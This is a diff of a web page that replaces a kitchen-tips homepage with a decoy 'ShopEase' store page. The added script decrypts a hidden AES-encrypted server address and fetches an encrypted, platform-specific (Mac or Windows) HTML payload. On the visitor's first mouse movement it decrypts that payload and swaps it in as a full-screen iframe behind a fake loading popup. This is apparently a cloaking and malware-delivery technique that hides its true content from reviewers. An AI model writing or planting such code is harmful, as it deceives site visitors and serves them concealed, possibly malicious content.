@@ -1,266 +1,293 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Contact</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Happy Kitchen Guide - Explore kitchen gadget organization tips, weekly meal prep guides, cast iron seasoning instructions, and cutting board hygiene.">
-    <title>Happy Kitchen Guide | Culinary Prep & Pantry Organization</title>
     
-    <!-- CSS Stylesheet -->
-    <link rel="stylesheet" href="style.css">
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0LY0HY7L01');
+</script>
+
+
 </head>
 <body>
 
-    <!-- Header Navigation -->
-    <header>
-        <nav class="navbar">
-            <a href="index.php" class="logo">Kitchen<span>Guide</span></a>
-            <ul class="nav-links">
-                <li><a href="index.php" class="active">Home</a></li>
-                <li><a href="collections.html">Collections</a></li>
-                <li><a href="blog/index.html">Blogs</a></li>
-                <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                <li><a href="terms.html">Terms & Conditions</a></li>
-            </ul>
-            <button class="menu-btn" aria-label="Toggle Navigation">
-                <span></span>
-                <span></span>
-                <span></span>
-            </button>
-        </nav>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
     </header>
 
-    <!-- Main Content -->
-    <main>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+ <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+uO7n727CJPFBFdf1fu4UUB7LEy0pCOEbetZjnrALXLQaidvdRcLP4e0SP8CZsvD8K8hm+2CXrgg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
         
-        <!-- Hero Section -->
-        <section class="hero">
-            <div class="hero-content reveal-item">
-                <span class="hero-badge">Kitchen Mastery</span>
-                <h1>Fired Up Cooking. Smart Prep. Curated for Chefs.</h1>
-                <p class="hero-desc">Discover the secrets of high-efficiency kitchen layouts, professional knife sharpening mechanics, and seasoned cast iron cookware care. Turn home cooking into a happy ritual.</p>
-                <div class="hero-btns">
-                    <a href="collections.html" class="btn btn-primary">Shop Guides</a>
-                    <a href="blog/index.html" class="btn btn-secondary">Read Journal</a>
-                </div>
-            </div>
-            <div class="hero-image-wrapper reveal-item">
-                <div class="hero-image-container">
-                    <img src="img/hero.jpg" alt="Clean organized kitchen workspace" loading="lazy">
-                </div>
-            </div>
-        </section>
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <!-- Highlights Section -->
-        <section id="categories">
-            <div class="section-title reveal-item">
-                <h2>THE CULINARY PILLARS</h2>
-                <p>High-carbon steel edges, modular storage bins, and physical heat seasoning guidelines.</p>
-            </div>
-            
-            <div class="features-grid">
-                <!-- Category 1 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <span class="feature-badge">Tools</span>
-                        <img src="img/knife.jpg" alt="Professional chef knife collection" loading="lazy">
-                    </div>
-                    <div class="feature-content">
-                        <h3>Knife Prep</h3>
-                        <p class="luxury-desc">Learn edge geometry, double-bevel sharpening, and proper cutting grips. Protect your hands and prep ingredients like a professional.</p>
-                    </div>
-                </div>
-
-                <!-- Category 2 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <span class="feature-badge">Storage</span>
-                        <img src="img/pantry.jpg" alt="Clean modular pantry shelves" loading="lazy">
-                    </div>
-                    <div class="feature-content">
-                        <h3>Pantry Storage</h3>
-                        <p class="luxury-desc">Organize dry goods in glass canisters, group spices by cooking profiles, and optimize shelf heights to reduce meal prep search times.</p>
-                    </div>
-                </div>
-
-                <!-- Category 3 -->
-                <div class="luxury-card reveal-item">
-                    <div class="feature-img-wrapper">
-                        <span class="feature-badge">Cookware</span>
-                        <img src="img/castiron.jpg" alt="Preseasoned cast iron skillet pan" loading="lazy">
-                    </div>
-                    <div class="feature-content">
-                        <h3>Cast Iron Cookware</h3>
-                        <p class="luxury-desc">Build a permanent natural non-stick seasoning coat. Understand heat oil polymer chemistry and correct washing methods.</p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Comparison Table Section -->
-        <section class="comparison-section">
-            <div class="section-title reveal-item">
-                <h2>THE EFFICIENCY CHART</h2>
-                <p>Compare professional prep organization against chaotic kitchen habits.</p>
-            </div>
-            
-            <div class="luxury-card reveal-item" style="padding: 3rem; overflow-x: auto;">
-                <table style="width: 100%; border-collapse: collapse; text-align: left; min-width: 600px;">
-                    <thead>
-                        <tr style="border-bottom: 3px solid var(--color-border); font-weight: 700;">
-                            <th style="padding: 1.2rem;">Kitchen Routine</th>
-                            <th style="padding: 1.2rem; color: var(--color-primary);">Happy Kitchen Guide</th>
-                            <th style="padding: 1.2rem; color: var(--color-fg-muted);">Conventional Kitchens</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr style="border-bottom: 3px solid var(--color-border);">
-                            <td style="padding: 1.2rem; font-weight: 700;">Knife Sharpening</td>
-                            <td style="padding: 1.2rem; color: var(--color-primary);">15-degree double-bevel whetstone sharpening</td>
-                            <td style="padding: 1.2rem; color: var(--color-fg-muted);">Dull edges, pull-through sharpeners (chips metal)</td>
-                        </tr>
-                        <tr style="border-bottom: 3px solid var(--color-border);">
-                            <td style="padding: 1.2rem; font-weight: 700;">Pantry Setup</td>
-                            <td style="padding: 1.2rem; color: var(--color-primary);">FIFO rotation, decanted airtight glass jars</td>
-                            <td style="padding: 1.2rem; color: var(--color-fg-muted);">Plastic retail bags, expired items in corners</td>
-                        </tr>
-                        <tr style="border-bottom: 3px solid var(--color-border);">
-                            <td style="padding: 1.2rem; font-weight: 700;">Cookware Care</td>
-                            <td style="padding: 1.2rem; color: var(--color-primary);">Polymerized oil coats, salt wash scrubbing</td>
-                            <td style="padding: 1.2rem; color: var(--color-fg-muted);">Abrasive wire scrubbers, soap soaking (rusts pans)</td>
-                        </tr>
-                        <tr style="border-bottom: 3px solid var(--color-border);">
-                            <td style="padding: 1.2rem; font-weight: 700;">Meal Preparation</td>
-                            <td style="padding: 1.2rem; color: var(--color-primary);">Pre-weighed mise en place prep bowls</td>
-                            <td style="padding: 1.2rem; color: var(--color-fg-muted);">Chop-as-you-go cooking, high burn risk</td>
-                        </tr>
-                        <tr>
-                            <td style="padding: 1.2rem; font-weight: 700;">Prep Trial</td>
-                            <td style="padding: 1.2rem; color: var(--color-primary);">30-day kitchen efficiency trial (Full return)</td>
-                            <td style="padding: 1.2rem; color: var(--color-fg-muted);">Immediate sale (No trial returns)</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-            
-            <div style="text-align: center; margin-top: 3.5rem;" class="reveal-item">
-                <a href="collections.html" class="btn btn-accent">Explore Prep Catalog</a>
-            </div>
-        </section>
-
-        <!-- Newsletter Section -->
-        <section class="newsletter-section reveal-item">
-            <div class="luxury-card newsletter-box">
-                <h2>JOIN THE KITCHEN REGISTRY</h2>
-                <p>Subscribe to receive early notifications on limited cookware drops, culinary cheat-sheets, and kitchen layout planners.</p>
-                <form class="newsletter-form" onsubmit="event.preventDefault(); alert('Welcome to the Happy Kitchen Registry!');">
-                    <input type="email" class="newsletter-input" placeholder="Enter your email address" required aria-label="Email address">
-                    <button type="submit" class="btn btn-accent">Subscribe</button>
-                </form>
-            </div>
-        </section>
-
-        <!-- Blog Highlights Section -->
-        <section class="recent-blogs">
-            <div class="section-title reveal-item">
-                <h2>FROM THE STUDIO JOURNAL</h2>
-                <p>Detailed insights on chef knives, cast iron pans, pantry organization, and cutting boards.</p>
-            </div>
-            
-            <div class="blog-grid">
-                <!-- Blog 1 -->
-                <div class="luxury-card blog-card reveal-item">
-                    <span class="blog-tag">Kitchen Tools</span>
-                    <h3>Edge of Excellence: The Ultimate Guide to Choosing Chef Knives</h3>
-                    <p class="blog-excerpt">Explore metal variables: high-carbon steel vs stainless, double-bevel grind geometries, and balance points compared.</p>
-                    <a href="blog/chef-knife-guide.html" class="blog-link">Read Article &rarr;</a>
-                </div>
-
-                <!-- Blog 2 -->
-                <div class="luxury-card blog-card reveal-item">
-                    <span class="blog-tag">Meal Prep</span>
-                    <h3>Sunday Prep: How to Organize Your Weekly Family Meal Prep</h3>
-                    <p class="blog-excerpt">Discover prep coordinates: washing veggies, batch-cooking protein bases, and glass container labeling schedules.</p>
-                    <a href="blog/meal-prep-efficiency.html" class="blog-link">Read Article &rarr;</a>
-                </div>
-
-                <!-- Blog 3 -->
-                <div class="luxury-card blog-card reveal-item">
-                    <span class="blog-tag">Cookware Care</span>
-                    <h3>Cast Iron Care: How to Season, Wash, and Restore Cast Iron Pans</h3>
-                    <p class="blog-excerpt">Analyze oil chemistry: flaxseed vs canola polymers, salt scrubbing steps, and rust restoration guides.</p>
-                    <a href="blog/cast-iron-seasoning.html" class="blog-link">Read Article &rarr;</a>
-                </div>
-            </div>
-            
-            <div style="text-align: center; margin-top: 4rem;" class="reveal-item">
-                <a href="blog/index.html" class="btn btn-secondary">View All Journal Articles</a>
-            </div>
-        </section>
-
-    </main>
-
-    <!-- Footer -->
-    <footer>
-        <div class="footer-container">
-            <div class="footer-col" style="flex: 1.5;">
-                <a href="index.php" class="logo" style="margin-bottom: 1.5rem; display: inline-block;">Kitchen<span>Guide</span></a>
-                <p>Happy Kitchen Guide celebrates technical culinary prep, smart cookware preservation, and high-efficiency pantry systems. We build for longevity and home comfort.</p>
-            </div>
-            <div class="footer-col">
-                <h4>Menu</h4>
-                <ul>
-                    <li><a href="index.php">Home</a></li>
-                    <li><a href="collections.html">Collections</a></li>
-                    <li><a href="blog/index.html">Blogs / Journal</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Compliance</h4>
-                <ul>
-                    <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                    <li><a href="terms.html">Terms & Conditions</a></li>
-                    <li><a href="disclaimer.html">Disclaimer</a></li>
-                    <li><a href="cookies.html">Cookies Policy</a></li>
-                </ul>
-            </div>
-            <div class="footer-col" style="flex: 1.2;">
-                <h4>Atelier Details</h4>
-                <p><strong>Address:</strong><br>181 Mercer Street, New York, NY 10012, United States</p>
-                <p><strong>Phone:</strong><br>+1-888-777-5845</p>
-                <p><strong>Email:</strong><br>concierge@happykitchenguide.com</p>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>&copy; 2026 Happy Kitchen Guide. All rights reserved.</p>
-            <div class="footer-bottom-links">
-                <a href="privacy-policy.html">Privacy Policy</a>
-                <a href="terms.html">Terms</a>
-                <a href="cookies.html">Cookies</a>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Cookie Consent Popup Banner -->
-    <div class="cookie-banner" id="cookieConsentBanner">
-        <h4 class="cookie-title">We Value Your Cooking Privacy</h4>
-        <p class="cookie-text">We use cookies to analyze web traffic metrics, verify shopping security, and deliver personalized kitchen layout recommendations. By clicking "Accept All", you agree to our policies.</p>
-        <div class="cookie-btns">
-            <button class="btn btn-primary" id="acceptCookiesBtn">Accept All</button>
-            <button class="btn btn-secondary" id="rejectCookiesBtn">Reject</button>
-        </div>
-    </div>
-
-    <!-- JS Scripts -->
-    <script src="script.js"></script>
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
